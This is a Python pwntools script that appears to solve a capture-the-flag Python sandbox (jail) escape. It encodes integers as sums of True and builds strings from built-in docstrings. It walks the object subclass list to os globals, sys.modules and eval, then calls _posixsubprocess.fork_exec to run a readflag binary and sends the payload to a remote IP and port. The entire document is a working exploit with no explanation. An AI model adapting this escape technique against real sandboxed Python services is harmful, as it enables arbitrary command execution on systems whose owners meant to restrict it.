from pwn import *

def gen_int(i):
        if i == 0:
                return "False"
        else:
                return "--".join(["True"] * i)

def call_function(f, arg):
        return (f"[[None for _.__class_getitem__ in [{f}]],"
                f"_[{arg}]][True]")

type_s = "_.__class__"
object_s = "_.__base__"
subclasses = call_function(type_s + ".__subclasses__", object_s) # _.__class__.__subclasses__(_.__base__)

wrap_close = f"{subclasses}[{gen_int(137)}]" # os._wrap_close
os_module = f"{wrap_close}.__init__.__globals__"

class ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz:pass

def build_string(string):
    src = [].__doc__.__doc__ + {}.__doc__
    final = ""
    for x in string:
        fromdoc = (a:=src.find(x)) != -1
        if fromdoc:
            final += f"[[].__doc__.__doc__+{{}}.__doc__][False][{gen_int(a)}]+" # not all chars are inside those docs
        else: final += f"_.__qualname__[{gen_int(ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.__qualname__.find(x))}]+" if ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.__qualname__.find(x) != -1 else f"{call_function('_.__class__.__subclasses__', '_.__base__')}[{gen_int(14)}].__doc__[True]+"
    return final[:-1]


sys_s = f"[*{os_module}][{gen_int(9)}]"
sys_modules = f"{os_module}[{sys_s}].modules"

main_module_s = f"[*{sys_modules}][{gen_int(22)}]"
eval_func = f"{sys_modules}[{main_module_s}].eval"

to_eval = build_string(f"[(os_module:=().__class__.__base__.__subclasses__()[{gen_int(137)}].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{{True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c}}readflag'.encode()],[f'.{{True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c}}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]")

system_sh = call_function(eval_func, to_eval).replace(' ', '\t')

with open("dump.py", "w") as f:
    f.write(system_sh)

r = remote("34.139.98.117", 6669)
r.sendline(system_sh)
r.interactive()